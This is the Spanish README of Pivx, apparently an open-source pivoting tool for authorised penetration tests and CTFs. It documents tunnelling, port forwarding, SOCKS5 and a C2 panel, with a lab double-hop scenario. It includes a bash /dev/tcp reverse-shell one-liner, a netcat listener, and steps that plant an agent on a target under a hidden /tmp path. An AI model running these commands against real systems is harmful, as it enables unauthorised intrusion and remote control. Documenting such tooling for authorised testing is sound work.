# Pivx 🕸️

![Go](https://img.shields.io/badge/Go-1.22+-00ADD8?logo=go&logoColor=white)
![Python](https://img.shields.io/badge/Python-3.11+-3776AB?logo=python&logoColor=white)
![DuckDB](https://img.shields.io/badge/DuckDB-1.0+-FFF000?logo=duckdb&logoColor=black)
![Streamlit](https://img.shields.io/badge/Streamlit-1.36+-FF4B4B?logo=streamlit&logoColor=white)
![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20WSL2-lightgrey)
[![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](../LICENSE)

[English](../README.md) | [Español](README_es.md) | [Português](README_pt.md) | [中文](README_zh.md)

**Herramienta de pivoting y enrutamiento de red para pruebas de penetración autorizadas.**
Pivx utiliza una arquitectura de **Framing Híbrido** que multiplexa **túneles L3,
port forwarding L4 y SOCKS5 L7** sobre una única conexión WebSocket con
**latencia ultrabaja** — sin cabeceras de framing adicionales, sin conexiones secundarias.

> **Estado actual (Fase 3):** suite completa de pivoting para CTF y pentesting.
> Consulta [`ARCHITECTURE.md`](../ARCHITECTURE.md) para el diseño completo.

---

## ⚡ Características Principales

- **Túnel L3** — Interfaz TUN `pivx0` con pila TCP/IP en espacio de usuario (gVisor netstack) en el agente. Enrutamiento IP completo a través del túnel.
- **Port Forwarding L4** — Reenvíos locales (`-L`) y remotos (`-R`) multiplexados sobre el mismo WebSocket. Ideal para reverse shells.
- **Proxy SOCKS5 L7** — Proxy dinámico con resolución DNS en el lado del agente. Compatible con proxychains, ffuf, Burp Suite y cualquier herramienta compatible con SOCKS.
- **Escaneo de Alta Fidelidad** — ICMP Smartping, Magic IP, anulación de SYN-Cookies y RST inteligente para resultados precisos de nmap a través del túnel.
- **Framing Híbrido** — Control (frames de texto JSON) + datos (frames binarios) en un mismo WebSocket. Paquetes L3 (nibble IP `0x4`/`0x6`) y flujos MUX (`0x01`) coexisten en frames binarios con discriminación de overhead cero.
- **Kill Switch** — Terminación remota del agente desde el panel C2 con un solo clic.
- **Plano de Datos Reforzado** — MTU 1350 (headroom para WebSocket/TLS), backpressure con descarte, protección anti-uplink de rutas.
- **Panel Web** — C2 basado en Streamlit con estado de agentes en tiempo real, control de túnel, gestión de rutas e interfaz de port forwarding.

---

## 🎯 Alta Fidelidad y Evasión

Pivx implementa mejoras de fidelidad de red que hacen que los escaneos a través del túnel sean indistinguibles de conexiones nativas. Todas las funcionalidades verificadas en pruebas automatizadas de laboratorio con Docker.

### ICMP Smartping

A diferencia de las herramientas de pivoting típicas, Pivx soporta **ping real a través del túnel L3**. El agente intercepta las solicitudes ICMP Echo Request, ejecuta un `ping` a nivel de sistema operativo para verificar que el host está activo y construye una respuesta Echo Reply correcta con checksums RFC 1071 válidos.

```bash
# Desde tu C2, con túnel y ruta activos:
ping -c 2 10.10.20.100

PING 10.10.20.100 (10.10.20.100) 56(84) bytes of data.
64 bytes from 10.10.20.100: icmp_seq=1 ttl=64 time=5.03 ms
64 bytes from 10.10.20.100: icmp_seq=2 ttl=64 time=2.88 ms

--- 10.10.20.100 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
```

Esto permite el **descubrimiento de hosts en nmap sin `-Pn`** — los hosts que responden al ping aparecen como *up* y nmap solo escanea esos.

### Magic IP (`240.0.0.1`)

El rango reservado Clase E `240.0.0.0/4` se reescribe a `127.0.0.1` en el agente, tanto a través del túnel L3 como vía SOCKS5/MUX. Accede a servicios que solo escuchan en el localhost de la víctima (bases de datos, paneles de administración, APIs internas) sin conflictos de IP:

```bash
# Vía SOCKS5 — acceder al servidor HTTP oculto en el localhost:8080 del agente:
curl --socks5-hostname 127.0.0.1:1080 http://240.0.0.1:8080/

# Devuelve: listado de directorio del sistema de archivos del agente
<!DOCTYPE HTML>
<html lang="en">
<head><title>Directory listing for /</title></head>
...
```

Cualquier IP en `240.x.x.x` funciona: `240.0.0.1`, `240.1.2.3`, etc. Todas redirigen al `127.0.0.1` del agente.

### Anulación de SYN-Cookies

Pivx deshabilita las SYN-Cookies de gVisor, evitando que el netstack responda SYN-ACK a **todos** los SYN sin crear estado. Sin esta corrección, `nmap -sS` mostraría todos los puertos como *open*. Con ella, solo los puertos realmente abiertos responden.

### RST Inteligente

Cuando el agente intenta conectar a un puerto cerrado y recibe `ECONNREFUSED`, devuelve RST al escáner. Si el objetivo no responde (timeout), permanece en silencio. Esto permite a nmap distinguir correctamente entre puertos *closed* (RST) y *filtered* (sin respuesta).

### Kill Switch

Desde el panel C2, un solo clic envía `{"type":"kill"}` al agente, que ejecuta `os.Exit(0)` inmediatamente. El WebSocket se cierra y el panel refleja el cambio al instante.

### Resultados de Pruebas Verificados

| Prueba | Resultado | Detalle |
|--------|-----------|---------|
| Smartping L3 (ping a través del túnel) | **PASADO** | 2/2 respuestas, ~4ms RTT |
| Magic IP L7 (240.0.0.1:8080 vía SOCKS5) | **PASADO** | HTTP 200, listado de directorio |
| Kill Switch (os.Exit remoto) | **PASADO** | Desconexión en <1s |

---

## 📋 Requisitos

- **Servidor:** Linux o **WSL2** (TUN usa `/dev/net/tun`). Requiere **root** (o `CAP_NET_ADMIN`) para crear la interfaz y agregar rutas.
- **Agente:** No se necesita instalación de Go — descarga el binario precompilado desde [Releases](https://github.com/HangLoose84/Pivx/releases). Solo Go 1.22+ si compilas desde el código fuente.

---

## 🚀 Inicio Rápido

### 1) Servidor (Python, Linux/WSL2)

> **Nota para Kali Linux y distribuciones modernas:** Python 3.11+ marca los paquetes del sistema como `externally-managed-environment` y bloquea `pip install` global. Pivx usa un **entorno virtual (`venv`)** para evitar esto. El script `install.sh` lo crea automáticamente.

**Instalación rápida (< 2 minutos):**

```bash
git clone https://github.com/HangLoose84/Pivx.git
cd Pivx
chmod +x install.sh
./install.sh
```

**Iniciar el C2:**

```bash
sudo server/venv/bin/streamlit run server/app.py
```

Se requiere `sudo` porque el servidor crea la interfaz TUN y manipula la tabla de enrutamiento del kernel. Invocar el `streamlit` del venv directamente evita la necesidad de `sudo -E` o activar el venv manualmente.

Listener WebSocket: `ws://0.0.0.0:8765` — Interfaz del panel: http://localhost:8501

### 2) Agente

> **No se necesita instalación ni compilación de Go** si solo quieres usar Pivx. Descarga el binario precompilado desde la pestaña [**Releases**](https://github.com/HangLoose84/Pivx/releases) y súbelo a la máquina objetivo:
>
> ```bash
> # Desde la máquina objetivo:
> wget https://github.com/HangLoose84/Pivx/releases/latest/download/pivx-agent-linux-amd64 -O /tmp/.p
> chmod +x /tmp/.p
> /tmp/.p --server ws://YOUR_C2:8765
> ```
>
> Binarios disponibles: `pivx-agent-linux-amd64`, `pivx-agent-linux-arm64`, `pivx-agent-windows-amd64.exe`.

#### Compilación desde el código fuente (avanzado)

Requiere **Go 1.22+**. Primera vez — obtener gVisor (rama especial `go`) y resolver dependencias:

```bash
cd agent
go get gvisor.dev/gvisor@go
go mod tidy
```

Ejecutar directamente:

```bash
go run . --server ws://127.0.0.1:8765
```

#### Compilación cruzada con `Makefile` (recomendado)

El `Makefile` raíz compila binarios estáticos y despojados de símbolos (`-ldflags="-s -w"` + `-trimpath`, sin símbolos ni DWARF) para minimizar el tamaño — crítico para subir agentes a través de conexiones inestables en CTFs.

```bash
make deps           # Una vez: obtener gVisor (rama `go`) y ordenar módulos
make                # Compilar las 3 plataformas en ./dist
```

Objetivos individuales:

```bash
make linux-amd64     # -> dist/pivx-agent-linux-amd64
make linux-arm64     # -> dist/pivx-agent-linux-arm64
make windows-amd64   # -> dist/pivx-agent-windows-amd64.exe
make clean           # Eliminar ./dist
```

Los binarios usan `CGO_ENABLED=0` (completamente estáticos, sin dependencia de libc en el objetivo). Ejemplo de despliegue:

```bash
scp dist/pivx-agent-linux-amd64 target:/tmp/.p
ssh target '/tmp/.p --server ws://YOUR_C2:8765'
```

### 3) Activar Túnel y Rutas

1. En el panel, sección **Tunnel**, selecciona el agente y haz clic en **Start tunnel** (crea `pivx0`).
2. En **Routes**, agrega la subred interna: haz clic en una **subred descubierta** del agente, o escríbela manualmente (`10.10.20.0/24`).
3. Tus herramientas locales ahora alcanzan la red interna a través del agente:

```bash
nmap -sS 10.10.20.0/24          # Escaneo SYN funciona (RST Inteligente + sin SYN-Cookies)
ping 10.10.20.5                  # Funciona (Smartping)
curl http://10.10.20.5/
```

### 4) Verificación

- El agente aparece **online** con hostname/OS/arch y sus subredes.
- `ip addr` en el servidor muestra `pivx0`; `ip route` muestra las subredes enrutadas a `pivx0`.
- El tráfico hacia la LAN interna funciona; aparecen líneas `[tcp] proxy established -> ...` en el log del agente.

### 5) Port Forwarding (L4) y SOCKS5 (L7)

Más allá del túnel L3, Pivx multiplexa **flujos TCP** sobre el mismo WebSocket. Estas funcionalidades **no requieren el túnel L3** — solo un agente conectado. En el panel, sección **Port forwarding (L4)**.

#### Reenvío local (`-L`) — exponer un servicio interno localmente

Pestaña **Local (-L)**. El servidor abre un puerto en tu máquina; el agente se conecta a un `IP:puerto` en la red interna.

```bash
# Bind: 127.0.0.1:8080 → Destino (agente): 10.10.20.5:80
curl http://127.0.0.1:8080/     # alcanza :80 en la red interna vía el agente
```

Útil para acceder a paneles de administración, bases de datos (`:3306`), RDP, etc.

#### Reenvío remoto (`-R`) — recibir reverse shells

Pestaña **Remote (-R)**. El **agente** abre un puerto en la red de la víctima; las conexiones entrantes se reenvían a tu handler local.

```bash
# Bind víctima: 0.0.0.0:4444 → Destino local: 127.0.0.1:5555
# En tu C2:
nc -lvnp 5555
# En la víctima: conectar a agent_ip:4444 → llega a tu 127.0.0.1:5555
```

#### SOCKS5 (L7) — proxy dinámico para herramientas web

Sección **SOCKS5 Proxy**. Haz clic en **Start SOCKS5** (por defecto `127.0.0.1:1080`). **La resolución DNS y las conexiones TCP ocurren en el agente**, por lo que los nombres de host internos se resuelven en la red de la víctima.

```bash
# proxychains (configurar /etc/proxychains4.conf → socks5 127.0.0.1 1080):
proxychains -q curl http://intranet.victim.local/
proxychains -q smbclient -L //10.10.20.5/

# Soporte SOCKS directo:
ffuf -x socks5://127.0.0.1:1080 -u http://10.10.20.5/FUZZ -w wordlist.txt
curl --socks5-hostname 127.0.0.1:1080 http://10.10.20.5/

# Burp Suite: Settings → Network → SOCKS proxy → 127.0.0.1:1080
#   (marcar "Do DNS lookups over SOCKS proxy")
```

---

## 🔀 Escenario: Doble Salto hacia Redes Aisladas

Ejemplo real probado con Docker: comprometer una máquina **sin acceso a internet** a través de un host pivote que conecta dos redes.

### Topología

```
  Tu máquina (Kali)            Red pública              Red interna (aislada)
  ┌─────────────┐          ┌─────────────┐          ┌──────────────────┐
  │  Pivx C2    │◄── WS ──►│  Pivote      │          │  Objetivo        │
  │  10.10.10.10│          │  10.10.10.20 │──────────│  10.10.20.100    │
  │             │          │  10.10.20.20 │          │  (sin internet)  │
  └─────────────┘          └─────────────┘          └──────────────────┘
    SOCKS5 :1080             Agente Pivx               HTTP :80
    Handler :9001            rforward :4444
```

El C2 **no puede alcanzar** `10.10.20.0/24` directamente. Pivx lo resuelve.

### Paso 1 — Desplegar el agente en el host pivote

```bash
scp dist/pivx-agent-linux-amd64 user@10.10.10.20:/tmp/.p
chmod +x /tmp/.p
/tmp/.p --server ws://10.10.10.10:8765
```

El agente se conecta, reporta sus interfaces y descubre la subred `10.10.20.0/24`. El panel lo muestra como **online**.

### Paso 2 — Alcanzar la red aislada con SOCKS5 (entrante)

Inicia SOCKS5 en el panel (`127.0.0.1:1080`):

```bash
# Escanear el objetivo aislado:
proxychains -q nmap -sT -Pn -p 22,80,443,445 10.10.20.100

# Navegar el servicio web interno:
curl --socks5-hostname 127.0.0.1:1080 http://10.10.20.100/

# Fuzzing de directorios:
ffuf -x socks5://127.0.0.1:1080 -u http://10.10.20.100/FUZZ -w wordlist.txt
```

Flujo de tráfico: `tu herramienta → SOCKS5 :1080 → MUX → pivote → 10.10.20.100`.

### Paso 3 — Recibir reverse shells con reenvío remoto (saliente)

El objetivo aislado no puede conectarse a tu C2, pero puede alcanzar el pivote. Usa **reenvío remoto** para retransmitir las conexiones:

```bash
# 1) Panel: Port forwarding → Remote (-R)
#    Bind víctima: 0.0.0.0:4444 → Destino local: 127.0.0.1:9001

# 2) Iniciar tu handler:
nc -lvnp 9001

# 3) Ejecutar payload en el objetivo apuntando al pivote:
bash -i >& /dev/tcp/10.10.20.20/4444 0>&1
```

Flujo de tráfico: `objetivo → pivote:4444 → MUX → C2:9001`.

### Resultados Verificados

Probado con laboratorios automatizados en Docker (3 contenedores, 2 redes aisladas):

| Prueba | Resultado | Latencia |
|--------|-----------|----------|
| SOCKS5 entrante → objetivo:80 | HTTP 200 completo | ~25ms |
| Reenvío remoto ← reverse shell | Payload recibido en C2:9001 | ~13s (espera del script) |
| Flujos residuales tras cierre | 0 (sin fugas) | — |

---

## 🗂️ Estructura del Proyecto

```
Pivx/
├── Makefile                  # Compilación cruzada (linux/amd64, arm64, win/amd64)
├── agent/                    # Agente Go
│   ├── go.mod
│   ├── main.go               # Transporte WS + control + descubrimiento (anti-uplink)
│   ├── netstack.go           # Pila gVisor (espacio de usuario) + reenviadores TCP/UDP (L3)
│   ├── icmp.go               # ICMP Smartping + inyección de UDP Port Unreachable
│   └── mux.go                # Multiplexación de flujos TCP (L4/L7) sobre mismo WS
├── server/
│   ├── app.py                # Panel Streamlit (túnel + rutas + forwarding + SOCKS)
│   ├── requirements.txt
│   └── pivx_server/
│       ├── db.py             # Persistencia DuckDB (agentes, rutas, logs)
│       ├── tun.py            # Interfaz TUN Linux (raw-IP, MTU 1350)
│       ├── runtime.py        # Orquestación TUN <-> WebSocket (plano L3)
│       ├── forward.py        # Capa MUX: port forwarding L4 + SOCKS5 (L4/L7)
│       └── ws_server.py      # Listener WebSocket (control + datos + demux L3/MUX)
├── ARCHITECTURE.md
└── README.md
```

---

## ⚠️ Limitaciones Conocidas

### Consejos de escaneo

Pivx soporta **ping a través del túnel** (Smartping) y **escaneos SYN** (anulación de SYN-Cookies + RST Inteligente). Modos de nmap soportados:

```bash
nmap -sn 10.10.20.0/24          # Descubrimiento de hosts con ping (Smartping)
nmap -sS 10.10.20.0/24          # Escaneo SYN (open/closed/filtered preciso)
nmap -sT 10.10.20.0/24          # Escaneo TCP connect (siempre funciona)
```

> **Nota:** Smartping ejecuta un `ping` real a nivel de SO por cada Echo Request, añadiendo ~3-5ms de latencia. Para escaneos a gran escala, `-Pn` sigue siendo más rápido ya que omite la fase de descubrimiento.

### Limitaciones actuales

- **Un solo túnel / un solo agente activo** a la vez (enfocado a CTF). Multi-agente simultáneo está **diferido** (Fase 5).
- **Sin TLS/wss ni autenticación de agente** aún (Fase 4). No usar fuera de un laboratorio o red controlada.
- **SOCKS5** solo implementa `CONNECT` sobre TCP (sin BIND ni UDP ASSOCIATE), suficiente para escaneo/fuzzing/proxy web.
- Un agente que pierde la conexión sin cierre limpio pasa a **`offline` automáticamente** tras ~45s sin pings (barrido keep-alive del servidor).

### Notas (gVisor / entorno)

- **gVisor** tiene una API sensible a la versión; este código sigue la rama `go`. Si `go mod tidy` desalinea símbolos, ajusta los nombres en `netstack.go` a la versión resuelta.
- No probado con Windows como servidor (se eligió Linux/WSL2 por soporte TUN).

---

> ⚠️ **Usar únicamente en sistemas propios o con autorización explícita por escrito.**

---

## 📄 Licencia

Este proyecto está licenciado bajo la **Licencia Pública General de GNU v3.0**. Consulta el archivo [LICENSE](../LICENSE) para el texto completo.
